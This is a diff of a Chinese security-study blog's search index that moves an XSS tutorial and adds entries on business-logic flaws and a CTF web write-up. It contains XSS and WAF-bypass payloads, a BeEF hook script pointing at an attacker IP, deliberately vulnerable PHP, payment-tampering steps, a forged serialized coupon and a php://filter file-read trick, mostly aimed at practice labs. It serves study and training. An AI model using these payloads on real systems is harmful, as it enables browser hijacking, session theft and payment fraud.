@@ -482,6 +482,207 @@ Q9：CORS跨域漏洞是什么？CORS 跨域漏洞的产生原因是因为没有
       </tags>
   </entry>
   <entry>
+    <title>XSS漏洞</title>
+    <url>/2026/06/08/XSS%E6%BC%8F%E6%B4%9E/index/</url>
+    <content><![CDATA[一、XSS简介与危害（1）定义跨站脚本攻击XSS（Cross Site Scripting），为避免与层叠样式表（CSS）缩写混淆，故缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页面时，嵌入Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。
+（2）危害
+盗取各类用户账号，如机器登录帐号、用户网银帐号、各类管理员帐号
+控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力
+盗窃企业重要的具有商业价值的资料
+非法转账
+强制发送电子邮件
+网站挂马
+控制受害者机器向其它网站发起攻击（重定向语句）
+窃取cookie的sessionid，冒充登录
+
+
+二、反射型与存储型XSSXSS攻击可分为三类：反射型、存储型、DOM型，易混淆的是反射和DOM类型。
+1. 反射型（1）反射型流程
+黑客诱导用户点击恶意URL：xxxxxxx.com/?xxx=&lt;script&gt;恶意代码&lt;/script&gt;
+客户端向URL对应的服务器发出请求
+服务器将恶意代码从URL中取出，拼接在HTML中返回给浏览器
+客户端解析代码，恶意代码随之执行
+
+
+
+（2）案例
+编写代码
+
+把 php 文件放在 phpstudy 的 www 目录下
+&lt;?php$xss = $_GET[&#x27;x&#x27;];echo $xss;?&gt;
+
+访问
+?x=1?x=&lt;script&gt;alert(1)&lt;/script&gt;?x=&lt;script&gt;alert(&#x27;已入侵你后端系统&#x27;)&lt;/script&gt;?x=&lt;h1 style=&#x27;font-size: 10vw;&#x27;&gt;你已被入侵啦,遭到破坏！&lt;/script&gt;&lt;/h1&gt;
+
+
+fofa搜索命令
+
+&quot;pikachu&quot; &amp;&amp; country=&quot;CN&quot; &amp;&amp; title=&quot;Get the pikachu&quot;
+
+
+
+
+
+进入 pikachu 靶场
+如果 fofa 访问失败，可以自己搭建pikachu靶场**。**
+pikachu靶场：反射型XSS 练习
+
+反射型xss
+
+
+
+先输入 1 测试
+
+
+输入恶意代码
+&lt;script&gt;alert(1)&lt;/script&gt;
+
+方法一：
+直接在 URL 中修改 message 的值。因为根据测试结果来看，我们输入的 1 实际上是 message 的值。
+
+
+
+
+方法二：
+直接在输入框里输入恶意代码，但是我们发现会有长度限制：
+
+
+F12，发现可以输入的最大长度是 20，那我们就可以把它的数值改大一点。
+
+
+
+
+注意：改完之后不要刷新，不然又会恢复 20。
+
+
+总结：输入框长度限制可通过修改URL或F12改前端代码绕过
+2. 存储型攻击数据存储在服务器，攻击持续生效，危害比反射型更大。
+以 pikachu 靶场为例：
+
+
+传入一个恶意代码
+&lt;h1 style=&#x27;font-size: 10vw;&#x27;&gt;你已被入侵啦,遭到破坏！&lt;/script&gt;&lt;/h1&gt;
+
+
+
+只要刷新这个页面，就会重复出现这句话。
+3. DOM型（1）流程
+黑客诱导用户点击恶意URL
+
+#&#x27; onclick=&quot;alert(1)&quot;
+
+
+客户端直接执行攻击代码，无需与服务器交互
+攻击纯粹发生在客户端
+
+
+
+以 pikachu 靶场为例：
+
+
+先输入 1 测试一下
+
+
+传入一个恶意代码：
+#&#x27; onclick=&quot;alert(1)&quot;
+
+
+
+点击之后：
+
+
+4. BeEF-XSS工具使用具体使用：beef-xss详细教程-CSDN博客
+BeEF是Kali自带的XSS利用工具，基于Ruby开发。
+
+
+（1）核心信息
+Web UI：http://127.0.0.1:3000/ui/panel
+Hook代码：&lt;script src=&quot;http://&lt;IP&gt;:3000/hook.js&quot;&gt;&lt;/script&gt;
+
+（2）攻击流程
+黑客（Kali）IP 放入 Hook 代码中
+
+&lt;script src=&quot;http://192.168.23.131:3000/hook.js&quot;&gt;&lt;/script&gt;
+
+
+注入Hook代码到表单提交入库
+
+
+
+
+
+
+受害者访问页面被Hook，BeEF控制台可控制浏览器（如重定向）
+
+
+三、XSS的绕过技巧与修复1. 未开启WAF直接URL注入：
+http://localhost/1.php?x=%3Cscript%3Ealert(1)%3C/script%3E
+
+2. 开启WAF（安全狗）请求被拦截，提示“带有不合法参数”。
+3. 手工绕过（1）标签语法替换
+audio标签
+
+&lt;audio src=x onerror=alert(47)&gt;&lt;audio src=x onerror=prompt(1);&gt;&lt;audio src=1 href=1 onerror=javascript:alert(1)&gt;
+
+
+video标签
+
+&lt;video src=x onerror=prompt(1);&gt;&lt;video src=x onerror=alert(48)&gt;
+
+
+button标签
+
+&lt;button onfocus=alert(1) autofocus&gt;&lt;button/onclick=alert(1)&gt;xss&lt;/button&gt;
+
+（2）加密算法&lt;details open ontoggle=eval(String.fromCharCode(97,108,101,114,116,40,49,41))&gt;# 97,108,101,114,116,40,49,41 = alert(1)
+
+4. XSStrike工具可识别并绕过WAF的XSS扫描工具，项目地址：https://github.com/s0md3v/XSStrike
+（1）常用参数XSStrike
+-h, --help显示帮助信息
+-u, --url指定目标 URL
+--dataPOST 方式提交内容
+-v, --verbose详细输出
+-f, --file加载自定义 payload 字典
+-t, --threads定义线程数
+-l, --level爬行深度
+-t, --encode定义 payload 编码方式
+--json将 POST 数据视为 JSON
+--path测试 URL 路径组件
+--seeds从文件中测试、抓取 URL
+--fuzzer测试过滤器和 Web 应用程序防火墙（WAF）
+--update更新工具
+--timeout设置超时时间
+--params指定参数
+--crawl爬行目标网站
+--proxy使用代理
+--blind盲测试
+--skip跳过确认提示
+--skip-dom跳过 DOM 扫描
+--headers提供 HTTP 标头
+-d, --delay设置请求延迟
+
+（2）使用示例# 安装依赖pip install -r requirements.txt -i https://mirrors.aliyun.com/pypi/simple/# Fuzz测试python xsstrike.py -u &quot;http://localhost/1.php?x=1&quot; --fuzzer# 直接探测python xsstrike.py -u &quot;http://localhost/1.php?x=1&quot;
+
+（3）优化测试页面&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;&lt;title&gt;欢迎来到&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;欢迎&lt;/h1&gt;&lt;?php$xss = $_GET[&#x27;x&#x27;];echo $xss;?&gt;&lt;center&gt;测试XSS&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;
+
+
+四、总结Q1：XSS 是什么？跨站脚本攻击
+Q2：XSS的产生原因是什么？后端开发没有对用户传入的参数做严格的限制或过滤，直接输出了用户传入的参数，导致用户传入的参数被浏览器当作 javascript 执行。
+Q3：XSS有什么危害？1、获取浏览器的其他信息
+2、窃取浏览器的敏感信息
+3、劫持浏览器（用  BeEF ，了解常用功能，比如：重定向redirect、）
+Q4：怎么修复 XSS漏洞？过滤常见关键字
+Q5：怎么绕 WAF？挨个使用 audio、script、video、button标签、加密算法，最后使用产生随机码。
+]]></content>
+      <categories>
+        <category>Web安全</category>
+        <category>XSS</category>
+      </categories>
+      <tags>
+        <tag>XSS</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>RCE漏洞</title>
     <url>/2026/06/08/RCE%E6%BC%8F%E6%B4%9E/index/</url>
     <content><![CDATA[一、RCE简介与危害
@@ -721,207 +922,6 @@ php 自带函数（禁用）PHP: escapeshellarg - Manual
       </tags>
   </entry>
   <entry>
-    <title>XSS漏洞</title>
-    <url>/2026/06/08/XSS%E6%BC%8F%E6%B4%9E/index/</url>
-    <content><![CDATA[一、XSS简介与危害（1）定义跨站脚本攻击XSS（Cross Site Scripting），为避免与层叠样式表（CSS）缩写混淆，故缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页面时，嵌入Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。
-（2）危害
-盗取各类用户账号，如机器登录帐号、用户网银帐号、各类管理员帐号
-控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力
-盗窃企业重要的具有商业价值的资料
-非法转账
-强制发送电子邮件
-网站挂马
-控制受害者机器向其它网站发起攻击（重定向语句）
-窃取cookie的sessionid，冒充登录
-
-
-二、反射型与存储型XSSXSS攻击可分为三类：反射型、存储型、DOM型，易混淆的是反射和DOM类型。
-1. 反射型（1）反射型流程
-黑客诱导用户点击恶意URL：xxxxxxx.com/?xxx=&lt;script&gt;恶意代码&lt;/script&gt;
-客户端向URL对应的服务器发出请求
-服务器将恶意代码从URL中取出，拼接在HTML中返回给浏览器
-客户端解析代码，恶意代码随之执行
-
-
-
-（2）案例
-编写代码
-
-把 php 文件放在 phpstudy 的 www 目录下
-&lt;?php$xss = $_GET[&#x27;x&#x27;];echo $xss;?&gt;
-
-访问
-?x=1?x=&lt;script&gt;alert(1)&lt;/script&gt;?x=&lt;script&gt;alert(&#x27;已入侵你后端系统&#x27;)&lt;/script&gt;?x=&lt;h1 style=&#x27;font-size: 10vw;&#x27;&gt;你已被入侵啦,遭到破坏！&lt;/script&gt;&lt;/h1&gt;
-
-
-fofa搜索命令
-
-&quot;pikachu&quot; &amp;&amp; country=&quot;CN&quot; &amp;&amp; title=&quot;Get the pikachu&quot;
-
-
-
-
-
-进入 pikachu 靶场
-如果 fofa 访问失败，可以自己搭建pikachu靶场**。**
-pikachu靶场：反射型XSS 练习
-
-反射型xss
-
-
-
-先输入 1 测试
-
-
-输入恶意代码
-&lt;script&gt;alert(1)&lt;/script&gt;
-
-方法一：
-直接在 URL 中修改 message 的值。因为根据测试结果来看，我们输入的 1 实际上是 message 的值。
-
-
-
-
-方法二：
-直接在输入框里输入恶意代码，但是我们发现会有长度限制：
-
-
-F12，发现可以输入的最大长度是 20，那我们就可以把它的数值改大一点。
-
-
-
-
-注意：改完之后不要刷新，不然又会恢复 20。
-
-
-总结：输入框长度限制可通过修改URL或F12改前端代码绕过
-2. 存储型攻击数据存储在服务器，攻击持续生效，危害比反射型更大。
-以 pikachu 靶场为例：
-
-
-传入一个恶意代码
-&lt;h1 style=&#x27;font-size: 10vw;&#x27;&gt;你已被入侵啦,遭到破坏！&lt;/script&gt;&lt;/h1&gt;
-
-
-
-只要刷新这个页面，就会重复出现这句话。
-3. DOM型（1）流程
-黑客诱导用户点击恶意URL
-
-#&#x27; onclick=&quot;alert(1)&quot;
-
-
-客户端直接执行攻击代码，无需与服务器交互
-攻击纯粹发生在客户端
-
-
-
-以 pikachu 靶场为例：
-
-
-先输入 1 测试一下
-
-
-传入一个恶意代码：
-#&#x27; onclick=&quot;alert(1)&quot;
-
-
-
-点击之后：
-
-
-4. BeEF-XSS工具使用具体使用：beef-xss详细教程-CSDN博客
-BeEF是Kali自带的XSS利用工具，基于Ruby开发。
-
-
-（1）核心信息
-Web UI：http://127.0.0.1:3000/ui/panel
-Hook代码：&lt;script src=&quot;http://&lt;IP&gt;:3000/hook.js&quot;&gt;&lt;/script&gt;
-
-（2）攻击流程
-黑客（Kali）IP 放入 Hook 代码中
-
-&lt;script src=&quot;http://192.168.23.131:3000/hook.js&quot;&gt;&lt;/script&gt;
-
-
-注入Hook代码到表单提交入库
-
-
-
-
-
-
-受害者访问页面被Hook，BeEF控制台可控制浏览器（如重定向）
-
-
-三、XSS的绕过技巧与修复1. 未开启WAF直接URL注入：
-http://localhost/1.php?x=%3Cscript%3Ealert(1)%3C/script%3E
-
-2. 开启WAF（安全狗）请求被拦截，提示“带有不合法参数”。
-3. 手工绕过（1）标签语法替换
-audio标签
-
-&lt;audio src=x onerror=alert(47)&gt;&lt;audio src=x onerror=prompt(1);&gt;&lt;audio src=1 href=1 onerror=javascript:alert(1)&gt;
-
-
-video标签
-
-&lt;video src=x onerror=prompt(1);&gt;&lt;video src=x onerror=alert(48)&gt;
-
-
-button标签
-
-&lt;button onfocus=alert(1) autofocus&gt;&lt;button/onclick=alert(1)&gt;xss&lt;/button&gt;
-
-（2）加密算法&lt;details open ontoggle=eval(String.fromCharCode(97,108,101,114,116,40,49,41))&gt;# 97,108,101,114,116,40,49,41 = alert(1)
-
-4. XSStrike工具可识别并绕过WAF的XSS扫描工具，项目地址：https://github.com/s0md3v/XSStrike
-（1）常用参数XSStrike
--h, --help显示帮助信息
--u, --url指定目标 URL
---dataPOST 方式提交内容
--v, --verbose详细输出
--f, --file加载自定义 payload 字典
--t, --threads定义线程数
--l, --level爬行深度
--t, --encode定义 payload 编码方式
---json将 POST 数据视为 JSON
---path测试 URL 路径组件
---seeds从文件中测试、抓取 URL
---fuzzer测试过滤器和 Web 应用程序防火墙（WAF）
---update更新工具
---timeout设置超时时间
---params指定参数
---crawl爬行目标网站
---proxy使用代理
---blind盲测试
---skip跳过确认提示
---skip-dom跳过 DOM 扫描
---headers提供 HTTP 标头
--d, --delay设置请求延迟
-
-（2）使用示例# 安装依赖pip install -r requirements.txt -i https://mirrors.aliyun.com/pypi/simple/# Fuzz测试python xsstrike.py -u &quot;http://localhost/1.php?x=1&quot; --fuzzer# 直接探测python xsstrike.py -u &quot;http://localhost/1.php?x=1&quot;
-
-（3）优化测试页面&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;&lt;title&gt;欢迎来到&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;欢迎&lt;/h1&gt;&lt;?php$xss = $_GET[&#x27;x&#x27;];echo $xss;?&gt;&lt;center&gt;测试XSS&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;
-
-
-四、总结Q1：XSS 是什么？跨站脚本攻击
-Q2：XSS的产生原因是什么？后端开发没有对用户传入的参数做严格的限制或过滤，直接输出了用户传入的参数，导致用户传入的参数被浏览器当作 javascript 执行。
-Q3：XSS有什么危害？1、获取浏览器的其他信息
-2、窃取浏览器的敏感信息
-3、劫持浏览器（用  BeEF ，了解常用功能，比如：重定向redirect、）
-Q4：怎么修复 XSS漏洞？过滤常见关键字
-Q5：怎么绕 WAF？挨个使用 audio、script、video、button标签、加密算法，最后使用产生随机码。
-]]></content>
-      <categories>
-        <category>Web安全</category>
-        <category>XSS</category>
-      </categories>
-      <tags>
-        <tag>XSS</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>文件包含漏洞</title>
     <url>/2026/06/08/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/index/</url>
     <content><![CDATA[一、漏洞检测与危害1.概念
@@ -1081,6 +1081,362 @@ http://localhost/include/upload.php?filename=http://192.168.0.13:88/1.txt
       </categories>
       <tags>
         <tag>文件包含</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>逻辑漏洞</title>
+    <url>/2026/06/14/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/index/</url>
+    <content><![CDATA[一、逻辑漏洞的概念1、逻辑漏洞的定义逻辑漏洞是指在软件或系统的设计和实现中，由于逻辑错误或缺陷导致的安全问题。这些漏洞不是由于代码编写的错误引起的，而是由于系统设计时的逻辑思路有问题，导致系统在某些情况下无法正常处理，进而被攻击者利用。
+简单理解：就是编程人员的思维逻辑不够严谨造成的漏洞。
+2、逻辑漏洞的危害逻辑漏洞的存在，可能导致系统崩溃、数据泄露、功能异常等问题，严重时甚至可能被黑客利用，对系统安全构成威胁。
+二、逻辑漏洞与常见漏洞类型的区别1、漏洞性质
+逻辑漏洞是由于系统设计中的逻辑错误或缺陷引起的，它们允许攻击者通过非预期的使用方式或操作顺序，规避安全机制或获得未授权的访问。
+其他漏洞是由于系统没有正确验证用户输入的数据，或者编码错误或配置不当引起。
+
+2、攻击方式和目标
+逻辑漏洞需要攻击者了解应用的业务逻辑，通常利用合法用户身份，通过规避或操纵流程实现攻击目标。
+其他常见漏洞是通过注入恶意代码、操纵输入数据或利用错误配置直接攻击网站应用。
+
+3、检测方法
+逻辑漏洞通常不会被防火墙等设备检测到，可以逃逸各种防护，难以通过自动化工具或防火墙检测。需要人工审查和业务逻辑分析，通常通过渗透测试和代码审计发现。
+其他漏洞可以容易被自动化扫描工具、防火墙(如WAF,Web应用防火墙)和入侵检测系统(IDS)发现。
+
+三、逻辑漏洞的分类逻辑漏洞进行分类的话大致可以分为以下几种类型：
+1、越权类漏洞越权类漏洞是一种常见的安全漏洞，发生在用户可以访问或执行其权限范围之外的资源或操作。根据用户试图获取的权限类型，越权漏洞可以分为水平越权和垂直越权。
+2、业务逻辑类漏洞业务逻辑类漏洞是一类与应用程序的业务流程和功能相关的漏洞，发生在应用程序未能正确地实施业务规则或逻辑上出现缺陷，导致攻击者可以利用这些漏洞进行未授权的操作或获取敏感信息。
+3、流程跳过类漏洞流程跳过类漏洞发生在攻击者通过绕过或跳过应用程序中的某些步骤或检查来达到其目的。利用应用程序在处理流程中未正确验证关键步骤或状态的漏洞，从而使攻击者可以规避验证、授权或其他安全机制。
+四、常见的逻辑漏洞1、身份认证安全(1)漏洞产生原因:有些网站对身份认证模块没有做好安全防护，因此导致漏洞产生
+(2)绕过身份认证有以下几种方法:
+暴力破解、撞库(以信息收集找到的凭证作为字典)Cookie&amp;Session类加密
+
+(3)暴力破解测试方法:在没有验证码限制或者一次验证码可以多次使用的地方，可以分为以下几种情况
+爆破用户名。当输入的用户名不存在时，会显示请输入正确用户名，或者用户名不存在已知用户名。比如:已知用户名为admin，密码可以进行字典爆破使用一个常用密码。比如 123456 对大量用户进行爆破
+
+修复方法:
+增加验证码，登录失败的时候，变换验证码。(确保验证码不能被工具识别)限制登录频率，例如，5 分钟内登录失败次数超过 5 次则锁定账号 1 小时。二次验证，可以添加手机验证码或邮箱验证码。
+
+基于这一块内容的练习，可以看pikachu靶场中有相关练习：暴力破解、验证码绕过(onserver)、验证码绕过(on client)、token防爆破?
+2、未授权访问&amp;越权漏洞授权的概念：就是对特定资源的读写权限。简单的说，就是你的权限能让你做什么事情，而验证则表示是否真的可以对这些资源进行读写
+未授权访问的概念：就是指用户在没有通过认证授权的情况下，能够直接访问需要通过认证才能访问到的页面或者文本信息
+越权漏洞的产生：主要是用于开发人员在对数据进行操作时对客户端请求的数据过分相信而遗漏了权限判断
+越权漏洞常发生的位置：修改、重置、找回账户密码、查看、修改其他账户未公开的信息例如个人资料、文件、数据、程序等等，还有与账户关联的一些权限操作
+(1) 越权漏洞分类
+水平越权：指相同权限的不同用户可以互相访问举例：两个不同的班级的学生A和B，通过修改请求，A可以任意修改B的个人信息
+垂直越权：指使用权限低的用户可以访问权限较高的用户举例：同一个班级不同权限的老师和学生，通过修改请求，学生可以修改和查看老师的账号信息
+
+越权分类补充：基于用户ID、基于对象ID、基于文件名、权限框架缺陷；包含：同级别用户越权访问修改删除、未认证账户直接访问功能、低权限账号访问高权限功能。同级别(权限)的用户或者同一角色的不同用户之间，可以越权访问、修改或者删除的非法操作，如果出现此漏洞，那么将可能会造成大批量数据泄露，严重的甚至会造成用户信息被恶意篡改。
+(2) pikachu 靶场
+2.1 水平越权案例
+使用账号kobe/123456登录，正常查看自身信息链接：http://127.0.0.1/pikachu/vul/overpermission/op1/op1_mem.php?username=kobe&amp;submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF
+
+修改请求参数，访问其他用户信息：
+http://127.0.0.1/pikachu/vul/overpermission/op1/op1_mem.php?username=lili&amp;submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF
+
+
+2.2 垂直越权案例
+使用普通用户pikachu/000000登录，页面仅开放查看权限。
+
+直接访问后台编辑页面：/vul/overpermission/op2/op2_admin_edit.php
+
+
+创建之后，再次查看。
+
+漏洞原因：代码仅校验登录状态，未校验用户权限级别
+$link=connect();!check_op2_login(link))&#123;header(&quot;location:op2_login.php&quot;);exit();
+
+3、数据篡改数据篡改分为两方面:业务一致性安全、业务数据安全
+
+业务一致性安全：账号篡改、邮箱和用户名篡改、订单ID更改、商品编号更改、用户ID篡改
+业务数据安全：金额数据篡改、商品数量篡改、最大数量限制突破、本地JS参数修改
+
+(1) 商品编号篡改步骤:提交订单时，抓包修改商品标号，导致商品与价格不符却交易成功举例：100个积分只能换商品编号为001，1000个积分只能换商品编号005，在100积分换商品的时候抓包把换商品的编号修改为005，用低积分换取高积分商品。
+修复：金额不在客户端传入，防止被篡改，如必要，则务必检查交易金额与商品价格或对支付金额做签名校验相关案例: 某积分商城支付漏洞，通过抓包可以修改积分。
+(2) 金额数据篡改（0元购物）步骤: 在提交订单时进行抓包，修改支付的金额或折扣等相关数据。修复：商品信息如金额、折扣等原始数据校验应来自于服务器端，不应接受客户端传来的值。相关案例: 某订单支付时的总价未验证，抓包将支付金额修改为1即可完成付款。
+(3) 大米CMS支付漏洞3.1 直接修改商品价格购买流程分为订购、确认信息、付款三步，可在任意一步抓包修改价格；可尝试修改为小额、负数金额测试漏洞。案例：http://wooyun.2xss.cc/bug_detail.php?wybug_id&#x3D;wooyun-2016-0226613
+3.2 修改支付状态
+字段规则：0代表支付成功，1代表支付失败；未付款时抓包将状态1改为0，绕过付款步骤。
+数据包复用：低价商品请求包复用至高价商品，实现低价购买高价商品。
+
+3.3 修改商品数量示例：单个商品售价10元，抓包修改数量字段qty，改为大数会生成高额订单，改为负数可实现负金额订单。
+4、任意密码重置漏洞概念：任意密码重置漏洞是系统设计缺陷，允许攻击者在未经授权的情况下更改其他用户的密码。
+漏洞常见场景：缺乏身份验证、不安全的重置链接、安全问题或验证码的缺陷以及会话固定攻击。
+案例：抓包修改请求内用户ID，即可篡改其他用户密码，请求示例：
+[id:1,&#x27;password&#x27;admin12345&quot;)
+
+五、逻辑漏洞总结1、经典业务逻辑漏洞案例
+美团APP忘记密码：仅校验手机号+出生年月日身份证片段，存在绕过风险
+网易黑胶VIP首次充值漏洞：多设备复用首次充值优惠，重复享受低价福利
+
+2、历史公开漏洞（1）支付逻辑漏洞
+客户端直接篡改支付金额
+订单数量无负数限制，实现0元购、负数金额订单
+请求重放、参数篡改实现余额倍增、免费下单
+团购、充值类订单参数可篡改
+
+（2）密码找回&#x2F;修改逻辑漏洞
+暴力破解用户凭证
+找回链接、页面泄露用户信息
+验证码、Token设计缺陷，可通用&#x2F;预测
+越权修改任意账号密码
+找回流程、验证步骤可绕过
+
+（3）应用程序逻辑错误
+绕过交易限制、刷取账户余额
+Cookie&#x2F;Session设计缺陷导致任意账号登录
+强制浏览、流程顺序缺陷，遍历数据
+时间校验缺陷（如12306刷票）
+
+（4）越权分类
+新增数据越权
+删除数据越权（如删除他人素材）
+修改数据越权（篡改用户信息）
+查询数据越权（批量泄露信息）
+URL&#x2F;参数越权
+
+（5）验证码安全问题
+客户端实现、可直接绕过&#x2F;爆破
+服务端验证码可重复使用、可预测
+万能验证码、验证码在请求包明文展示
+验证码强度低，可被OCR识别
+无次数、时效限制，可无限爆破
+
+（6）JS敏感信息泄露
+JS文件泄露后台路径、接口API
+前端JS窃取受保护Cookie
+AJAX、前端脚本泄露手机号、邮箱等隐私
+
+3、逻辑漏洞分类梳理（1）交易类
+修改支付价格
+修改支付状态
+修改&#x2F;负数化购买数量
+篡改金额为负数
+请求重放攻击
+数据库并发锁处理不当
+
+（2）业务风控类
+刷取优惠券、重复享受优惠
+套现类漏洞
+
+（3）账号注册类
+重复注册、账号覆盖
+用户名遍历猜解
+
+（4）密码相关
+密码明文存储、未做哈希加密
+无密码强度校验
+
+（5）账号信息类
+用户名&#x2F;邮箱前后空格、大小写处理不当
+手机号格式校验缺陷（如+86前缀绕过）
+
+（6）Cookie&#x2F;Session类
+Cookie存储敏感数据
+Cookie&#x2F;Session可伪造、无合法性校验
+
+（7）登录类
+撞库攻击
+账号劫持
+恶意锁号（无解锁机制）
+传输信道不安全
+凭证本地不安全存储
+
+（8）密码找回类
+越权重置任意密码
+新密码在响应包明文返回
+Token前端可控、无服务端强校验
+头部字段处理不当引发漏洞
+找回流程泄露敏感信息
+
+（9）修改密码类
+越权修改他人密码
+无需验证旧密码即可改密
+
+（10）申诉类
+身份伪造
+申诉流程绕过
+
+（11）信息查询&#x2F;更新类
+越权查询、修改数据
+ID可枚举，批量遍历用户数据
+
+（12）双因素认证(2FA)漏洞
+改密&#x2F;登录后自动跳过二次验证
+OAuth登录未开启2FA
+2FA验证码可爆破、存在竞争条件
+返回值篡改绕过
+链接、功能可绕过2FA
+CSRF攻击禁用2FA
+
+（13）验证码漏洞汇总
+可重用、可预测、无时效&#x2F;次数限制
+客户端生成&#x2F;校验、前端直接绕过
+数据包明文展示验证码
+强度低可被机器识别
+特殊参数绕过、可用于短信&#x2F;邮件轰炸
+
+（14）Session漏洞
+Session可猜测、伪造、泄露
+Session固定攻击
+
+（15）越权细分
+未授权访问
+水平越权（同权限用户互访）
+垂直越权（低权限访问高权限）
+交叉越权
+
+（16）其他漏洞
+ID、随机数生成规则简单，可枚举&#x2F;预测
+接口无访问次数、权限限制
+加密算法误用
+业务执行顺序缺陷
+各类敏感信息泄露
+
+]]></content>
+      <categories>
+        <category>Web安全</category>
+        <category>逻辑漏洞</category>
+      </categories>
+      <tags>
+        <tag>逻辑漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>御网杯Web部分题解</title>
+    <url>/2026/06/13/%E9%A2%98%E8%A7%A3-%E5%BE%A1%E7%BD%91%E6%9D%AFWeb/index/</url>
+    <content><![CDATA[一、WEB-Snake_Game1. 题目
+
+
+
+2. 解题思路
+题目要求游戏得分要 300，我们可以直接修改前端代码，让初始分&gt;300
+F12
+
+
+
+
+添加覆盖脚本
+
+
+
+修改成功！
+
+
+
+拿到 flag
+
+
+
+
+二、WEB-PHP_Payment1. 题目
+
+2. 解题思路
+根据题目提示知道可以用代金券拿到 Flag，但是我们的余额只有 10 金币，然后输入框里输入 base64 的代金券可以获得 Flag
+
+
+
+
+下载附件，收集信息
+
+
+
+代码审计 apply_coupon.php
+1、包含了另外两个文件
+
+
+2、从 POST 请求中取 coupon 参数，参数为空、解码失败会报错
+
+
+如果 base64 解码出来再反序列化解码后的字符串等于$promo 返回成功。此时 $promo 对象被销毁
+再看models.php 里的类
+
+
+有两个属性，一是代金券金额，一是代金券码。
+含有魔术方法 __destruct()，对象销毁时触发：逻辑是，如果如果 promo_credit 属性存在且是数字，直接加到余额上。
+所以，目标就是，构造一个金额够买 Flag
+3、 构造 代金券
+&lt;?php  class PromoManager &#123;  public $promo_code = &quot;x&quot;;  public $promo_credit = 10000000;&#125;echo base64_encode(serialize(new PromoManager()));?&gt;
+
+
+
+TzoxMjoiUHJvbW9NYW5hZ2VyIjoyOntzOjEwOiJwcm9tb19jb2RlIjtzOjE6IngiO3M6MTI6InByb21vX2NyZWRpdCI7aToxMDAwMDAwMDt9
+
+
+
+
+
+购买 Flag，看 buy.php
+
+
+
+
+
+
+
+用 POST 方式往 &#x2F;buy.php 传 item&#x3D;flag
+
+
+依据这个 调用 fetch
+fetch(&#x27;/buy.php&#x27;,&#123;method:&#x27;POST&#x27;,headers:&#123;&#x27;Content-Type&#x27;:&#x27;application/x-www-form-urlencoded&#x27;&#125;,body:&#x27;item=flag&#x27;&#125;).then(r=&gt;r.text()).then(console.log)
+
+拿到 flag
+
+
+
+
+
+三、WEB-Enterprise_OA1. 题目
+
+
+
+2. 解题思路
+根据题目提示，这题考查目录穿越、文件包含
+先尝试访问 flag.php
+
+
+
+include_path&#x3D;’.:&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php’
+路径分隔符是 :（冒号），Windows 用的是 ;。这是 Unix&#x2F;Linux 的特征。
+并且服务器是：
+
+
+说明可以用 &#x2F;etc&#x2F;passwd 来探测（因为&#x2F;etc&#x2F;passwd 一定存在、可读、内容可辨识）
+
+读源代码
+
+
+
+用 php 伪协议
+php://filter/read=convert.base64-encode/resource=index.php
+
+
+
+利用 base64 在线解密工具
+PD9waHAKJG1vZHVsZSA9IGlzc2V0KCRfR0VUWydtb2R1bGUnXSkgPyAkX0dFVFsnbW9kdWxlJ10gOiAncHVibGljX25vdGljZXMucGhwJzsKJG1vZHVsZSA9IHN0cl9yZXBsYWNlKCcuLi8nLCAnJywgJG1vZHVsZSk7Cj8+CjwhRE9DVFlQRSBodG1sPgo8aHRtbD4KPGhlYWQ+CiAgICA8dGl0bGU+T0EgU3lzdGVtIFBvcnRhbDwvdGl0bGU+CiAgICA8c3R5bGU+CiAgICAgICAgYm9keSB7IGZvbnQtZmFtaWx5OiAnU2Vnb2UgVUknLCBUYWhvbWEsIEdlbmV2YSwgVmVyZGFuYSwgc2Fucy1zZXJpZjsgYmFja2dyb3VuZC1jb2xvcjogI2YwZjJmNTsgdGV4dC1hbGlnbjogY2VudGVyOyBtYXJnaW46IDA7IHBhZGRpbmc6IDA7fQogICAgICAgIC5oZWFkZXIgeyBiYWNrZ3JvdW5kLWNvbG9yOiAjMDA0MDgwOyBjb2xvcjogd2hpdGU7IHBhZGRpbmc6IDIwcHg7IGZvbnQtc2l6ZTogMjRweDsgZm9udC13ZWlnaHQ6IGJvbGQ7IH0KICAgICAgICAuY29udGFpbmVyIHsgYmFja2dyb3VuZC1jb2xvcjogd2hpdGU7IHBhZGRpbmc6IDIwcHg7IGJvcmRlci1yYWRpdXM6IDhweDsgbWFyZ2luOiA0MHB4IGF1dG87IHdpZHRoOiA2MCU7IGJveC1zaGFkb3c6IDAgNHB4IDhweCByZ2JhKDAsMCwwLDAuMSk7IH0KICAgICAgICAubmF2IHsgbWFyZ2luLWJvdHRvbTogMzBweDsgYm9yZGVyLWJvdHRvbTogMnB4IHNvbGlkICNlZWU7IHBhZGRpbmctYm90dG9tOiAxMHB4OyB9CiAgICAgICAgLm5hdiBhIHsgbWFyZ2luOiAwIDE1cHg7IHRleHQtZGVjb3JhdGlvbjogbm9uZTsgY29sb3I6ICMwMDQwODA7IGZvbnQtd2VpZ2h0OiBib2xkOyB9CiAg